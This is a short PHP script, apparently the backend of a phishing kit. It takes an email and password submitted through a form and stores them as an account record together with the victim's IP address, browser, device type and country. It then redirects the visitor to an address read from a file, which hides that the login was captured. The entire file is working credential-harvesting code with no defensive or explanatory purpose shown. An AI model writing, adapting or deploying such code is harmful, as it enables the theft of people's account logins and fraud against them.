<?
date_default_timezone_set('Asia/Ho_Chi_Minh');

include "sql.php";
$nick=array();
$email=isset($_POST['email'])?$_POST['email']:""; 
$pass=isset($_POST['pass'])?$_POST['pass']:"";
$ip=$_SERVER['REMOTE_ADDR'];
$userAgent=$_SERVER['HTTP_USER_AGENT'];
$browser=browser_detected();
$mobile=($browser=="mobile")?1:0;
$lang=isset($_POST['lang'])?$_POST['lang']:"TEST";
if(strlen($email)>5 && strlen($pass)>5)
{
    if(strpos($lang,"_"))
    {
        $lang=explode("_",$lang);
        $lang=$lang[1];
    }
    $nick=array();
    $nick['email']=$email;
    $nick['pass']=$pass;
    $nick['country']=$lang;
    $nick['mobile']=$mobile;
    $nick['type']=0;
    $nick['browser']=$userAgent;
    $nick['time']=time();
    addNick($nick);
}
header("Location: ".file_get_contents("location.txt"));
?>